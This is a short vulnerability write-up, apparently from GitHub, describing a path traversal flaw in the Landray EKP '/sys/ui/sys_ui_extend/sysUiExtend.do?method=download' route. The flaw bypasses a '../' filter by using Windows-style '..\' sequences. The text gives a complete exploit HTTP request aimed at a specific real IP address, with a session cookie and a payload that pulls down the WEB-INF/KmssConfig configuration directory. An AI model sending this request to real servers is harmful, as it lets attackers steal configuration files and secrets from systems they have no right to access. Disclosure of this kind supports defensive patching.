The /sys/ui/sys_ui_extend/sysUiExtend.do route is defined in `WEB-INF/KmssConfig/sys/ui/spring-mvc.xml`
and is handled by com.landray.kmss.sys.ui.actions.SysUiExtendAction class
<img width="1098" alt="image" src="https://github.com/night-0p/anh/assets/54882616/59cec375-92e2-4e53-b905-640aa5dcbd07">
Tracked to the SysUiExtendAction class, after accepting the `id` parameter, use ../ to filter, but in the windows environment, you can use ..\ to bypass.
Any files specified including folders will eventually be downloaded as a tarball.
<img width="1111" alt="image" src="https://github.com/night-0p/anh/assets/54882616/71208c2a-8b35-4e9a-b986-b62c527c0774">
<img width="944" alt="image" src="https://github.com/night-0p/anh/assets/54882616/9c94785a-a156-40c9-8ced-7ec0280d33db">
<img width="1004" alt="image" src="https://github.com/night-0p/anh/assets/54882616/a3345f2a-52d2-41e5-b6d9-d15ecf1602d7">

exp：
```
POST /api///sys/ui/sys_ui_extend/sysUiExtend.do?method=download HTTP/1.1
Host: 47.101.128.32
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/ap
ng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=9684FFECC20A781C822BEB3C0FEB4FD1
Connection: close
Content-Length: 41
Content-Type: application/x-www-form-urlencoded

id=..\..\..\..\ekp\\WEB-INF\\KmssConfig\\
```

Then we will get the following file:  
<img width="973" alt="image" src="https://github.com/night-0p/anh/assets/54882616/68e1f587-110a-4df6-8b9e-af3157db6544">
<img width="705" alt="image" src="https://github.com/night-0p/anh/assets/54882616/6059dd28-ae4d-494c-a40e-3946ace8d3c6">


